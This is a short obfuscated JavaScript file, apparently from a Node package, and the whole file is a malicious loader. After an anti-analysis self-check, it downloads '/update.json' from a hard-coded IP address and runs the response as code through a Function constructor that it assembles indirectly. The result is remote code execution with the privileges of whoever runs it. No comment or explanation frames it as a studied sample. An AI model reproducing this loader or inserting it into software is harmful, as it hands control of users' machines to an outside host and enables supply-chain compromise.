;(function () {
  var _0x29b71e = (function () {
    var _0x48af04 = true
    return function (_0xa2becf, _0x34a78b) {
      var _0x4bdaa0 = _0x48af04
        ? function () {
            if (_0x34a78b) {
              var _0x210b9a = _0x34a78b.apply(_0xa2becf, arguments)
              _0x34a78b = null
              return _0x210b9a
            }
          }
        : function () {}
      _0x48af04 = false
      return _0x4bdaa0
    }
  })()
  var _0x324102 = _0x29b71e(this, function () {
    return _0x324102
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x324102)
      .search('(((.+)+)+)+$')
  })
  _0x324102()
  var _0x2b994a = require('http')
  return _0x2b994a.get(
    {
      host: '23.94.46.191',
      port: 80,
      path: '/update.json',
    },
    function (_0x5740eb) {
      var _0x540c44 = ''
      _0x5740eb.on('data', function (_0x2e8a60) {
        _0x540c44 += _0x2e8a60
      })
      _0x5740eb.on('end', function () {
        var _0xcc219f =
          this[
            (typeof this.Buffer.from).charAt(0).toUpperCase() +
              (typeof this.Buffer.from).slice(1)
          ]
        var _0x568acc = new _0xcc219f(_0x540c44)
        _0x568acc()
      })
    }
  )
})()
